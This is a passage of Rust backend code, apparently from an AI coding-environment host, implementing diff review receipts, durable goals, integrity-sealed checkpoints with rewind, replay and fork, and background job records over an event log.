        hunk_id: Option<&str>,
    ) -> Result<()> {
        let provenance = hunk_id
            .and_then(|id| proposal.hunk(id))
            .map(|h| serde_json::to_value(&h.provenance).unwrap_or(Value::Null));
        self.services
            .event_log
            .append(NewEvent::system(
                proposal.session_id.clone(),
                kind,
                json!({
                    "diff_id": proposal.diff_id,
                    "run_id": proposal.run_id,
                    "hunk_id": hunk_id,
                    "provenance": provenance,
                    "proposal": serde_json::to_value(proposal).unwrap_or(Value::Null),
                }),
            ))
            .await?;
        Ok(())
    }

    /// Republish the diff projection onto the Wire-B bus so the FE HunkReview
    /// control re-renders with the current per-hunk status. The ONE producer of the
    /// diff surface: every path that creates a proposal or flips a hunk status
    /// (`record_edit_diff`, `apply_diff`, `apply_hunk`, `reject_hunk`, `revert_diff`)
    /// routes through here.
    ///
    /// This used to publish an untyped `Custom{kind:"diff"}` that the frontend routes
    /// nowhere, so it decayed into a truncated JSON toast and the whole review surface
    /// had no live data at all. It now publishes the two projections the surface
    /// actually reads (see [`diff_projections`]).
    fn publish_diff(&self, proposal: &DiffProposal) {
        publish_diff_to(&self.ui_bus, proposal);
    }

    /// Mark the verification receipts whose scope intersects any of `files` as
    /// invalidated (census sec 23): append a durable `verify.invalidated` event
    /// naming the affected verification ids + scope so a rerun is warranted. Reuses
    /// the same scope-intersection logic ([`scopes_intersect`] /
    /// `hide_verify::paths_intersect`) as [`Self::reconcile_review_for_scope`].
    /// Model-free.
    async fn invalidate_verifications_for_files(
        &self,
        session: &SessionId,
        files: &[String],
    ) -> Result<()> {
        if files.is_empty() {
            return Ok(());
        }
        let receipts = self.verification_receipts(session).await?;
        let already = self.invalidated_verification_ids(session).await?;
        let stale: Vec<String> = receipts
            .iter()
            .filter(|r| scopes_intersect(&r.receipt.scope, files))
            .map(|r| r.receipt.verification_id.clone())
            .filter(|id| !already.contains(id))
            .collect();
        if stale.is_empty() {
            return Ok(());
        }
        self.services
            .event_log
            .append(NewEvent::system(
                session.clone(),
                "verify.invalidated",
                json!({ "verification_ids": stale, "scope": files, "reason": "diff hunk rejected" }),
            ))
            .await?;
        Ok(())
    }

    /// The verification ids marked invalidated for a session (folded from
    /// `verify.invalidated` events). A receipt whose id is here should be rerun.
    pub async fn invalidated_verification_ids(&self, session: &SessionId) -> Result<Vec<String>> {
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        let mut out = Vec::new();
        for e in events {
            if e.kind == "verify.invalidated" {
                if let Some(ids) = e.payload.get("verification_ids").and_then(|v| v.as_array()) {
                    out.extend(ids.iter().filter_map(|v| v.as_str().map(str::to_string)));
                }
            }
        }
        Ok(out)
    }

    /// Export a sealed review receipt over a diff (census sec 23): the hunks with
    /// their accept/reject status + provenance, plus the verification receipts
    /// before and after the review. Sealed with a blake3 over the canonical body
    /// and recorded as a durable `diff.receipt` event; read back via
    /// [`Self::diff_review_receipts`].
    pub async fn export_diff_review_receipt(
        &self,
        diff_id: &str,
        verification_before: Vec<VerificationReceipt>,
        verification_after: Vec<VerificationReceipt>,
    ) -> Result<DiffReviewReceipt> {
        let proposal = self.diff_get(diff_id).ok_or_else(|| unknown_diff(diff_id))?;
        let sealed_ms = hide_core::ids::now_ms();
        let body = json!({
            "diff_id": proposal.diff_id,
            "run_id": proposal.run_id,
            "hunks": proposal.hunks,
            "verification_before": verification_before,
            "verification_after": verification_after,
            "sealed_ms": sealed_ms,
        });
        let seal = blake3::hash(serde_json::to_string(&body).unwrap_or_default().as_bytes())
            .to_hex()
            .to_string();
        let receipt = DiffReviewReceipt {
            diff_id: proposal.diff_id.clone(),
            run_id: proposal.run_id.clone(),
            hunks: proposal.hunks.clone(),
            verification_before,
            verification_after,
            sealed_ms,
            seal,
        };
        self.services
            .event_log
            .append(NewEvent::system(
                proposal.session_id.clone(),
                "diff.receipt",
                serde_json::to_value(&receipt).unwrap_or(Value::Null),
            ))
            .await?;
        Ok(receipt)
    }

    /// The wire arm for [`Self::export_diff_review_receipt`] (`{ diff_id, session_id? }`): seal the
    /// diff's hunks with the session's verification receipts and publish the sealed record.
    ///
    /// The before/after split is the diff's own `created_ms`: a receipt sealed before the first
    /// hunk of this diff was recorded verified the pre-review tree, and one sealed after verified
    /// the reviewed tree. No client input picks the split, so two exports of the same diff seal the
    /// same body.
    async fn handle_export_review_receipt_intent(&self, payload: &Value) -> Result<()> {
        let diff_id = payload
            .get("diff_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                hide_core::error::HideError::Message(
                    "export_review_receipt: missing 'diff_id'".to_string(),
                )
            })?;
        let proposal = self.diff_get(diff_id).ok_or_else(|| unknown_diff(diff_id))?;
        let session = payload
            .get("session_id")
            .and_then(|v| v.as_str())
            .map(SessionId::from)
            .unwrap_or_else(|| proposal.session_id.clone());
        let (before, after): (Vec<VerificationReceipt>, Vec<VerificationReceipt>) = self
            .verification_receipts(&session)
            .await?
            .into_iter()
            .map(|r| r.receipt)
            .partition(|r| r.started_ms < proposal.created_ms);
        let receipt = self
            .export_diff_review_receipt(diff_id, before, after)
            .await?;
        self.publish_custom(
            Some(session),
            json!({
                "kind": "diff_review_receipt",
                "record": serde_json::to_value(&receipt).unwrap_or(Value::Null),
            }),
        );
        Ok(())
    }

    /// Every sealed diff review receipt recorded for a session, in log order.
    pub async fn diff_review_receipts(
        &self,
        session: &SessionId,
    ) -> Result<Vec<DiffReviewReceipt>> {
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        Ok(events
            .into_iter()
            .filter(|e| e.kind == "diff.receipt")
            .filter_map(|e| e.payload_as::<DiffReviewReceipt>())
            .collect())
    }

    // --- Durable GOAL (bible sec 14, sec 78.1 #3) ---

    /// Set (or replace) a session's durable GOAL: a persisted completion
    /// `condition` + a STRUCTURED, model-free `acceptance` (oracle names whose
    /// latest `verify.result` verdict must be `Pass`). The record is written to the
    /// KV `goals` namespace keyed by session, so it survives a workspace reopen.
    /// Surfaces a `goal_set` UiEvent under the session.
    pub fn goal_set(
        &self,
        session: SessionId,
        condition: impl Into<String>,
        acceptance: Vec<String>,
    ) -> Result<GoalRecord> {
        let record = GoalRecord::active(
            GoalStore::new_id(&session),
            session,
            condition,
            acceptance,
        );
        GoalStore::put(&self.services.key_value_store, &record)?;
        self.publish_goal(&record, "goal_set");
        Ok(record)
    }

    /// The session's durable goal, if one is set.
    pub fn goal_get(&self, session: &SessionId) -> Option<GoalRecord> {
        GoalStore::get(&self.services.key_value_store, session)
    }

    /// Retire a session's goal: flip its status to `Cleared` (durably) and return
    /// the cleared record. `None` when no goal was set. Surfaces a `goal_cleared`
    /// UiEvent.
    pub fn goal_clear(&self, session: &SessionId) -> Result<Option<GoalRecord>> {
        let kv = &self.services.key_value_store;
        match GoalStore::get(kv, session) {
            Some(mut record) => {
                record.status = GoalStatus::Cleared;
                record.updated_ms = hide_core::ids::now_ms();
                GoalStore::put(kv, &record)?;
                self.publish_goal(&record, "goal_cleared");
                Ok(Some(record))
            }
            None => Ok(None),
        }
    }

    /// DETERMINISTICALLY evaluate a session's goal against durable evidence in the
    /// event log -- NO model. The acceptance (oracle names) is checked against the
    /// LATEST `verify.result` verdict for each named oracle in the session; an
    /// empty acceptance falls back to the session's latest verification verdict.
    /// The verdict carries the outcome (`Met`/`NotMet`/`DeferredModelRequired`), a
    /// reason, and the ids of the evidence events consulted.
    ///
    /// A natural-language / model-judged condition is `DEFERRED_MODEL_REQUIRED`:
    /// this path never loads a model. When the outcome is `Met`, the goal's durable
    /// status is advanced to `Met` and a `goal_met` UiEvent is surfaced.
    ///
    /// Errors with `NotFound` when no goal is set for the session.
    pub async fn goal_evaluate(&self, session: &SessionId) -> Result<GoalVerdict> {
        let kv = &self.services.key_value_store;
        let mut goal = GoalStore::get(kv, session).ok_or_else(|| {
            hide_core::error::HideError::NotFound(format!("no goal set for session {session}"))
        })?;
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        let verdict = evaluate_goal(&goal, &events);
        // Advance + surface a Met transition durably (idempotent): only when the
        // goal is not already Met (and not deliberately Cleared).
        if verdict.outcome == GoalOutcome::Met && goal.status == GoalStatus::Active {
            goal.status = GoalStatus::Met;
            goal.updated_ms = hide_core::ids::now_ms();
            GoalStore::put(kv, &goal)?;
            self.publish_goal_met(&goal, &verdict);
        }
        Ok(verdict)
    }

    /// Publish a goal-lifecycle UiEvent (`goal_set` / `goal_cleared`) carrying the
    /// record, under the goal's session.
    fn publish_goal(&self, record: &GoalRecord, kind: &str) {
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(record.session_id.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": kind,
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    /// Publish a `goal_met` UiEvent carrying the record + the evaluation verdict.
    fn publish_goal_met(&self, record: &GoalRecord, verdict: &GoalVerdict) {
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(record.session_id.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": "goal_met",
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
                "verdict": serde_json::to_value(verdict).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    // --- Durable CHECKPOINT (bible sec 15.4, sec 78.1 #3) ---

    /// Create a durable CHECKPOINT: a named restore boundary over a session's
    /// event-sourced history. The boundary is `at_event` (resolved strictly;
    /// `NotFound` if absent) or, when `None`, the session's current tail. The
    /// record seals a blake3 `integrity` digest over its boundary identity
    /// (session + seq + boundary event) so a later restore can prove the boundary
    /// was not tampered. Written to the KV `checkpoints` namespace; surfaces a
    /// `checkpoint_created` UiEvent under the session.
    pub async fn checkpoint_create(
        &self,
        session: SessionId,
        at_event: Option<&EventId>,
        label: impl Into<String>,
    ) -> Result<CheckpointRecord> {
        let at_seq = match at_event {
            Some(id) => self.replay.seq_of_event(session.clone(), id).await?,
            None => self.replay.latest_seq(session.clone()).await?,
        };
        let coverage = self.compute_coverage(&session, at_seq).await?;
        let record = CheckpointRecord::seal(
            CheckpointStore::new_id(&session, at_seq),
            session,
            at_event.cloned(),
            at_seq,
            label,
            coverage,
        );
        CheckpointStore::put(&self.services.key_value_store, &record)?;
        // Durable as well as live. The `checkpoint_created` publish below is bus-only, so a browser
        // reload lost the id that seven of the ten history verbs address while the record itself was
        // still on disk. Recorded HERE, the one place a CheckpointRecord is ever minted, so every
        // client that catches up (`replay::event_to_ui_event` maps `checkpoint.created`) gets it
        // back rather than each surface needing its own read.
        self.services
            .event_log
            .append(NewEvent::system(
                record.session_id.clone(),
                "checkpoint.created",
                serde_json::to_value(&record).unwrap_or_else(|_| json!({})),
            ))
            .await?;
        self.publish_checkpoint(&record, "checkpoint_created");
        Ok(record)
    }

    /// Compute the [`CheckpointCoverage`] references at a boundary (bible sec
    /// 15.4; consolidation Trace E): the code (repo) state, the thread and plan
    /// state (folded from the log at the boundary), the goal in force, and the
    /// artifact references. Model-free: a live model-state capsule stays
    /// `DEFERRED_MODEL_REQUIRED` and is recorded as `None`.
    async fn compute_coverage(&self, session: &SessionId, at_seq: u64) -> Result<CheckpointCoverage> {
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        // Thread + plan come from the projection folded to the boundary (reusing
        // the time-travel scrub); repo + artifacts fold the log directly.
        let projection = self.replay.scrub_to_event(session.clone(), at_seq).await?;
        let code = rewind::code_state(&events, Some(at_seq));
        let repo_items: Vec<String> = code.iter().map(|(f, h)| format!("{f}:{h}")).collect();
        let plan = match projection.plan.as_ref() {
            Some(p) => StateRef::counted(
                p.steps.len(),
                &serde_json::to_string(p).unwrap_or_default(),
            ),
            None => StateRef::default(),
        };
        let goal = GoalStore::get(&self.services.key_value_store, session).map(|g| rewind::GoalRef {
            goal_id: g.goal_id,
            status: format!("{:?}", g.status),
            condition: g.condition,
        });
        let artifacts = rewind::artifact_refs(&events, Some(at_seq));
        Ok(CheckpointCoverage {
            repo_state: StateRef::of(&repo_items),
            thread: StateRef::of(&projection.transcript),
            plan,
            goal,
            artifacts: StateRef::of(&artifacts),
            live_state_capsule: None, // DEFERRED_MODEL_REQUIRED
        })
    }

    /// Every durable checkpoint for a session, ordered deterministically.
    pub fn checkpoint_list(&self, session: &SessionId) -> Vec<CheckpointRecord> {
        CheckpointStore::list_for_session(&self.services.key_value_store, session)
    }

    /// Restore a CHECKPOINT: produce a NEW session whose durable history is the
    /// checkpoint's source folded up to (and including) the checkpoint boundary.
    /// The integrity digest is VERIFIED first (a tampered boundary errors); an
    /// unknown checkpoint id errors with `NotFound`. Independence + fold reuse
    /// [`BackendReplayService::fork_session`] exactly as the fork path does, so the
    /// source is untouched. Ancestry (parent = the checkpoint's source + the
    /// boundary) is recorded in the KV `session_records` namespace. Surfaces a
    /// `checkpoint_restored` UiEvent under the restored session.
    pub async fn checkpoint_restore(
        &self,
        checkpoint_id: &str,
    ) -> Result<(SessionId, crate::services::SessionRecord, SessionProjection)> {
        Self::gated_effect("checkpoint_restore")?;
        let record = CheckpointStore::get(&self.services.key_value_store, checkpoint_id)
            .ok_or_else(|| {
                hide_core::error::HideError::NotFound(format!(
                    "unknown checkpoint {checkpoint_id}"
                ))
            })?;
        if !record.verify_integrity() {
            return Err(hide_core::error::HideError::InvalidState(format!(
                "checkpoint {checkpoint_id} failed integrity check (boundary tampered)"
            )));
        }
        // Fold the source up to the sealed boundary into a fresh, independent
        // lineage (reuses the fork machinery), then record ancestry pointing back
        // at the checkpoint's source + boundary.
        let (restored, projection) = self
            .replay
            .fork_session(record.session_id.clone(), record.at_seq)
            .await?;
        let ancestry = crate::services::SessionRecord::fork(
            restored.clone(),
            record.session_id.clone(),
            record.at_seq,
            record.at_event.clone(),
        );
        self.services
            .sessions
            .record_session(&self.services.key_value_store, &ancestry);
        self.publish_checkpoint_restored(&restored, &record, &ancestry);
        Ok((restored, ancestry, projection))
    }

    /// Publish a `checkpoint_created` UiEvent carrying the record, under its session.
    fn publish_checkpoint(&self, record: &CheckpointRecord, kind: &str) {
        self.ui_bus.publish(UiEvent {
            seq: record.at_seq,
            session_id: Some(record.session_id.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": kind,
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    /// Publish a `checkpoint_restored` UiEvent under the RESTORED session (so the
    /// FE, which adopts a session off any event's id, switches to it), carrying the
    /// source checkpoint + the restored session's ancestry record.
    fn publish_checkpoint_restored(
        &self,
        restored: &SessionId,
        checkpoint: &CheckpointRecord,
        ancestry: &crate::services::SessionRecord,
    ) {
        self.ui_bus.publish(UiEvent {
            seq: checkpoint.at_seq,
            session_id: Some(restored.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": "checkpoint_restored",
                "checkpoint": serde_json::to_value(checkpoint).unwrap_or_else(|_| json!({})),
                "record": serde_json::to_value(ancestry).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    // --- Checkpoint rewind / replay / fork / compare / inspect (Trace E) -----
    //
    // Deepens the checkpoint boundary into a real rewind + fork surface over the
    // event log. Port provenance (see HIDE_DONOR_PORT_LEDGER.md): the rewind fold
    // adapts grok-build's merge_rewind_points_from (revert-as-event-fold instead
    // of file write-back); the ForkPoint boundary is a clean-room reimplementation
    // of Codex's subagent_history_start_ordinal. Model-free: no model is loaded.

    /// Load a checkpoint and VERIFY its sealed integrity (boundary + coverage);
    /// errors on an unknown id or a tampered record. Shared by every rewind path.
    fn load_verified_checkpoint(&self, checkpoint_id: &str) -> Result<CheckpointRecord> {
        let record = CheckpointStore::get(&self.services.key_value_store, checkpoint_id)
            .ok_or_else(|| {
                hide_core::error::HideError::NotFound(format!("unknown checkpoint {checkpoint_id}"))
            })?;
        if !record.verify_integrity() {
            return Err(hide_core::error::HideError::InvalidState(format!(
                "checkpoint {checkpoint_id} failed integrity check (boundary or coverage tampered)"
            )));
        }
        Ok(record)
    }

    /// The code (repo) state of a session, folding `diff.proposed` up to `up_to`
    /// (or the tail when `None`): file -> latest content hash.
    async fn code_state_of(
        &self,
        session: &SessionId,
        up_to: Option<u64>,
    ) -> Result<std::collections::BTreeMap<String, String>> {
        let events = self
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await?;
        Ok(rewind::code_state(&events, up_to))
    }

    /// Build the fork-boundary marker for a child inheriting `inherited` prefix
    /// events up to parent seq `at_seq`.
    fn fork_marker(&self, parent: &SessionId, inherited: usize, at_seq: u64) -> (ForkPoint, NewEvent) {
        let fp = ForkPoint::new(parent.clone(), inherited, at_seq);
        let marker = NewEvent::system(
            parent.clone(),
            rewind::FORK_POINT_KIND,
            serde_json::to_value(&fp).unwrap_or(Value::Null),
        );
        (fp, marker)
    }

    /// REWIND a domain (code / conversation / both) back to a checkpoint boundary
    /// into a fresh, independent child session (consolidation Trace E). The child
    /// re-materializes the checkpoint prefix (inherited context, behind a
    /// [`ForkPoint`] marker) plus every post-boundary event whose domain the target
    /// does NOT revert, so a code-only rewind reverts the code while PRESERVING the
    /// conversation (and vice versa). Reports the reverted files and the
    /// verification receipts the rewind invalidates (post-boundary receipts whose
    /// file scope intersects a reverted file, using the same path-intersection the
    /// verify authority rule uses).
    ///
    /// A `Code` or `Both` rewind ALSO reverts the working tree: every post-boundary
    /// hunk is rejected newest-first through [`Self::reject_hunk`], i.e. the same
    /// verifying inverse write the diff reject path uses, so the files on disk
    /// really do go back to the boundary. The source session's history is not
    /// rewritten; the disk revert is recorded on it as ordinary `diff.hunk.rejected`
    /// events, exactly as if the hunks had been rejected by review. Model-free.
    pub async fn checkpoint_rewind(
        &self,
        checkpoint_id: &str,
        target: RewindTarget,
    ) -> Result<RewindOutcome> {
        Self::gated_effect("checkpoint_rewind")?;
        let record = self.load_verified_checkpoint(checkpoint_id)?;
        let source = record.session_id.clone();
        let at_seq = record.at_seq;
        let events = self
            .services
            .event_log
            .scan(Some(source.clone()), None, None)
            .await?;

        // What a code rewind reverts: files changed between the boundary and the
        // tail (a conversation-only rewind reverts no code).
        let base = rewind::code_state(&events, Some(at_seq));
        let head = rewind::code_state(&events, None);
        let reverted_files = match target {
            RewindTarget::Conversation => Vec::new(),
            RewindTarget::Code | RewindTarget::Both => rewind::changed_files(&base, &head),
        };
        let receipts = rewind::receipt_scopes(&events, at_seq);
        let invalidated_receipts = rewind::invalidated_receipts(&reverted_files, &receipts);

        // Revert those files ON DISK before minting the child, newest hunk first so
        // later edits to the same file peel off first. Same verifying inverse write
        // as the diff reject path, so a file changed since the edit CONFLICTS and
        // fails the rewind closed instead of being clobbered.
        // ponytail: no transaction, so a conflict part way leaves the earlier files
        // reverted (the same exposure `revert_diff` already has). Add a staged
        // write-back if a partially reverted tree ever becomes a real problem.
        if target != RewindTarget::Conversation {
            for (diff_id, hunk_id) in rewind::post_boundary_hunks(&events, at_seq).into_iter().rev()
            {
                let already_reverted = self.diff_get(&diff_id).is_some_and(|p| {
                    p.hunks
                        .iter()
                        .any(|h| h.hunk_id == hunk_id && h.status == HunkStatus::Rejected)
                });
                if !already_reverted {
                    self.reject_hunk(&diff_id, &hunk_id).await?;
                }
            }
        }

        // Seed a fresh lineage from the surviving events behind a fork marker.
        let child_events = rewind::rewind_child_events(&events, at_seq, target);
        let inherited = rewind::inherited_len(&events, at_seq);
        let (fork_point, marker) = self.fork_marker(&source, inherited, at_seq);
        let (child, projection) = self
            .replay
            .seed_child_session(Some(marker), &child_events)
            .await?;

        let ancestry = crate::services::SessionRecord::fork(
            child.clone(),
            source.clone(),
            at_seq,
            record.at_event.clone(),
        );
        self.services
            .sessions
            .record_session(&self.services.key_value_store, &ancestry);
        self.publish_checkpoint_child(
            "checkpoint_rewound",
            &child,
            &record,
            json!({
                "target": target,
                "reverted_files": reverted_files,
                "invalidated_receipts": invalidated_receipts,
                "fork_point": fork_point,
            }),
        );
        Ok(RewindOutcome {
            session_id: child,
            target,
            fork_point,
            reverted_files,
            invalidated_receipts,
            projection,
            ancestry,
        })
    }

    /// REPLAY from a checkpoint: re-apply the whole recorded history from the
    /// checkpoint forward onto a fresh, independent lineage seeded at the
    /// checkpoint (behind a [`ForkPoint`] marker). The post-boundary source events
    /// are the replayed set (the child's own records). Unlike a rewind, replay
    /// drops nothing. Model-free.
    pub async fn checkpoint_replay(&self, checkpoint_id: &str) -> Result<ReplayOutcome> {
        let record = self.load_verified_checkpoint(checkpoint_id)?;
        let source = record.session_id.clone();
        let at_seq = record.at_seq;
        let events = self
            .services
            .event_log
            .scan(Some(source.clone()), None, None)
            .await?;
        let child_events: Vec<&Event> = events.iter().collect();
        let replayed_events: Vec<EventId> = events
            .iter()
            .filter(|e| e.seq > at_seq)
            .map(|e| e.id.clone())
            .collect();
        let inherited = rewind::inherited_len(&events, at_seq);
        let (fork_point, marker) = self.fork_marker(&source, inherited, at_seq);
        let (child, projection) = self
            .replay
            .seed_child_session(Some(marker), &child_events)
            .await?;
        let ancestry = crate::services::SessionRecord::fork(
            child.clone(),
            source.clone(),
            at_seq,
            record.at_event.clone(),
        );
        self.services
            .sessions
            .record_session(&self.services.key_value_store, &ancestry);
        self.publish_checkpoint_child(
            "checkpoint_replayed",
            &child,
            &record,
            json!({ "replayed": replayed_events.len(), "fork_point": fork_point }),
        );
        Ok(ReplayOutcome {
            session_id: child,
            fork_point,
            replayed_events,
            projection,
            ancestry,
        })
    }

    /// FORK from a checkpoint into an ephemeral branch: a new lineage seeded ONLY
    /// with the checkpoint's inherited prefix (behind a [`ForkPoint`] marker), to
    /// explore an alternative from the boundary with no post-boundary carry-over.
    /// Recorded as an [`SessionRelationship::EphemeralFork`](crate::services::SessionRelationship)
    /// so a client can prune it without ceremony. Model-free.
    pub async fn checkpoint_fork(&self, checkpoint_id: &str) -> Result<ForkOutcome> {
        let record = self.load_verified_checkpoint(checkpoint_id)?;
        let source = record.session_id.clone();
        let at_seq = record.at_seq;
        let events = self
            .services
            .event_log
            .scan(Some(source.clone()), None, None)
            .await?;
        let child_events: Vec<&Event> = events.iter().filter(|e| e.seq <= at_seq).collect();
        let inherited = child_events.len();
        let (fork_point, marker) = self.fork_marker(&source, inherited, at_seq);
        let (child, projection) = self
            .replay
            .seed_child_session(Some(marker), &child_events)
            .await?;
        let ancestry = crate::services::SessionRecord::ephemeral_fork(
            child.clone(),
            source.clone(),
            at_seq,
            record.at_event.clone(),
        );
        self.services
            .sessions
            .record_session(&self.services.key_value_store, &ancestry);
        self.publish_checkpoint_child(
            "checkpoint_forked",
            &child,
            &record,
            json!({ "fork_point": fork_point }),
        );
        Ok(ForkOutcome {
            session_id: child,
            fork_point,
            projection,
            ancestry,
        })
    }

    /// COMPARE a session's current code state against a checkpoint's boundary code
    /// state (current-versus-checkpoint): the file-level added/removed/modified
    /// changes. Model-free.
    pub async fn compare_to_checkpoint(
        &self,
        checkpoint_id: &str,
        session: &SessionId,
    ) -> Result<CodeComparison> {
        let record = CheckpointStore::get(&self.services.key_value_store, checkpoint_id)
            .ok_or_else(|| {
                hide_core::error::HideError::NotFound(format!("unknown checkpoint {checkpoint_id}"))
            })?;
        let base = self
            .code_state_of(&record.session_id, Some(record.at_seq))
            .await?;
        let head = self.code_state_of(session, None).await?;
        Ok(CodeComparison {
            base: format!("checkpoint:{}", record.checkpoint_id),
            head: format!("session:{}", session.as_str()),
            files: rewind::diff_code_states(&base, &head),
        })
    }

    /// COMPARE two sessions' current code states (compare branches). Model-free.
    pub async fn compare_session_code(
        &self,
        a: &SessionId,
        b: &SessionId,
    ) -> Result<CodeComparison> {
        let base = self.code_state_of(a, None).await?;
        let head = self.code_state_of(b, None).await?;
        Ok(CodeComparison {
            base: format!("session:{}", a.as_str()),
            head: format!("session:{}", b.as_str()),
            files: rewind::diff_code_states(&base, &head),
        })
    }

    /// INSPECT a checkpoint's integrity + coverage (consolidation Trace E part d):
    /// whether the sealed digest verifies, whether the coverage recomputed from the
    /// current source log still matches (drift detection), and which verification
    /// receipts a code rewind from here would invalidate. Model-free.
    pub async fn checkpoint_inspect(&self, checkpoint_id: &str) -> Result<CheckpointInspection> {
        let record = CheckpointStore::get(&self.services.key_value_store, checkpoint_id)
            .ok_or_else(|| {
                hide_core::error::HideError::NotFound(format!("unknown checkpoint {checkpoint_id}"))
            })?;
        let integrity_ok = record.verify_integrity();
        let current = self.compute_coverage(&record.session_id, record.at_seq).await?;
        let drift = coverage_drift(&record.coverage, &current);

        let events = self
            .services
            .event_log
            .scan(Some(record.session_id.clone()), None, None)
            .await?;
        let base = rewind::code_state(&events, Some(record.at_seq));
        let head = rewind::code_state(&events, None);
        let reverted_files = rewind::changed_files(&base, &head);
        let receipts = rewind::receipt_scopes(&events, record.at_seq);
        let invalidated_receipts = rewind::invalidated_receipts(&reverted_files, &receipts);

        Ok(CheckpointInspection {
            checkpoint_id: record.checkpoint_id.clone(),
            integrity_ok,
            coverage_current: drift.is_empty(),
            drift,
            reverted_files,
            invalidated_receipts,
            coverage: record.coverage.clone(),
        })
    }

    /// Publish a checkpoint-child lifecycle UiEvent (rewound / replayed / forked)
    /// under the child session, carrying the source checkpoint + operation detail.
    fn publish_checkpoint_child(
        &self,
        kind: &str,
        child: &SessionId,
        checkpoint: &CheckpointRecord,
        detail: Value,
    ) {
        self.ui_bus.publish(UiEvent {
            seq: checkpoint.at_seq,
            session_id: Some(child.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": kind,
                "session_id": child.as_str(),
                "checkpoint": serde_json::to_value(checkpoint).unwrap_or_else(|_| json!({})),
                "detail": detail,
            })),
        });
    }

    // --- Durable background JOBS + triggers (bible sec 73-75, sec 78.1 #17) ---

    /// Create a durable BACKGROUND JOB: a goal-bound record that survives a
    /// restart. The `job` is written to the KV `jobs` namespace keyed by its
    /// `job_id`, and a `job.created` event is appended to the session's durable
    /// event log so the record is BOUND to that log (auditable + recoverable). A
    /// `job_created` UiEvent is surfaced under the session. Build the record via
    /// [`JobRecord::pending`] (plus its builders) so the id + timestamps are set.
    ///
    /// This persists the durable record only. The ACTUAL agent execution of the
    /// job when a trigger fires is DEFERRED_MODEL_REQUIRED: this method never runs
    /// a model or spawns an agent.
    pub async fn job_create(&self, job: JobRecord) -> Result<JobRecord> {
        JobStore::put(&self.services.key_value_store, &job)?;
        self.services
            .event_log
            .append(NewEvent::system(
                job.session_id.clone(),
                "job.created",
                serde_json::to_value(&job).unwrap_or(Value::Null),
            ))
            .await?;
        self.publish_job(&job, "job_created");
        Ok(job)
    }

    /// The durable job with `job_id`, if any.
    pub fn job_get(&self, job_id: &str) -> Option<JobRecord> {
        JobStore::get(&self.services.key_value_store, job_id)
    }

    /// Every durable job, ordered deterministically (created_ms then job_id).
    pub fn job_list(&self) -> Vec<JobRecord> {
        JobStore::list_all(&self.services.key_value_store)
    }

    /// DETERMINISTICALLY evaluate whether an incoming `event` matches ANY trigger
    /// on `job` (bible sec 75) -- the wake predicate. NO model; a pure function of
    /// the job's triggers and the event's kind + payload (a `FileChange` glob is
    /// matched against the event path, a `Manual` trigger fires only on a `Manual`
    /// event, etc.).
    ///
    /// A `true` here means the job SHOULD be dispatched; the actual dispatch /
    /// execution is DEFERRED_MODEL_REQUIRED and is not performed by this call.
    pub fn job_evaluate_triggers(&self, job: &JobRecord, event: &TriggerEvent) -> bool {
        job.matches_event(event)
    }

    /// Durably transition a job's `status` (bible sec 73), stamping `updated_ms`
    /// and recording an optional `last_error`. The updated record is written back
    /// to KV, a `job.status` event is appended to the session log, and a
    /// `job_status` UiEvent is surfaced. Returns the updated record, or `None` when
    /// no such job exists.
    pub async fn job_update_status(
        &self,
        job_id: &str,
        status: JobStatus,
        last_error: Option<String>,
    ) -> Result<Option<JobRecord>> {
        let kv = &self.services.key_value_store;
        match JobStore::get(kv, job_id) {
            Some(mut job) => {
                job.status = status;
                job.updated_ms = hide_core::ids::now_ms();
                if last_error.is_some() {
                    job.last_error = last_error;
                }
                JobStore::put(kv, &job)?;
                self.services
                    .event_log
                    .append(NewEvent::system(
                        job.session_id.clone(),
                        "job.status",
                        serde_json::to_value(&job).unwrap_or(Value::Null),
                    ))
                    .await?;
                self.publish_job(&job, "job_status");
                Ok(Some(job))
            }
            None => Ok(None),
        }
    }

    /// Cancel a job: flip its status to `Cancelled` durably (a terminal state
    /// excluded from `jobs_recover`), append a `job.cancelled` event, and surface a
    /// `job_cancelled` UiEvent. Returns the cancelled record, or `None` when no
    /// such job exists.
    pub async fn job_cancel(&self, job_id: &str) -> Result<Option<JobRecord>> {
        let kv = &self.services.key_value_store;
        match JobStore::get(kv, job_id) {
            Some(mut job) => {
                job.status = JobStatus::Cancelled;
                job.updated_ms = hide_core::ids::now_ms();
                JobStore::put(kv, &job)?;
                self.services
                    .event_log
                    .append(NewEvent::system(
                        job.session_id.clone(),
                        "job.cancelled",
                        serde_json::to_value(&job).unwrap_or(Value::Null),
                    ))
                    .await?;
                self.publish_job(&job, "job_cancelled");
                Ok(Some(job))
            }
            None => Ok(None),
        }
    }

    /// Rebuild the ACTIVE background-job set from the durable store on startup
    /// (bible sec 73): every job whose status is Pending / Running / Blocked,
    /// ordered deterministically. Terminal jobs (Done / Cancelled / Failed) are
    /// excluded. A fresh [`BackendHost`] over the same workspace recovers exactly
    /// this set, so scheduled / triggered jobs SURVIVE A RESTART. Re-dispatching a
    /// recovered job when its trigger next fires is DEFERRED_MODEL_REQUIRED.
    pub fn jobs_recover(&self) -> Vec<JobRecord> {
        JobStore::recover(&self.services.key_value_store)
    }

    /// Publish a job-lifecycle UiEvent (`job_created` / `job_status` /
    /// `job_cancelled`) carrying the record, under the job's session.
    fn publish_job(&self, record: &JobRecord, kind: &str) {
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(record.session_id.clone()),
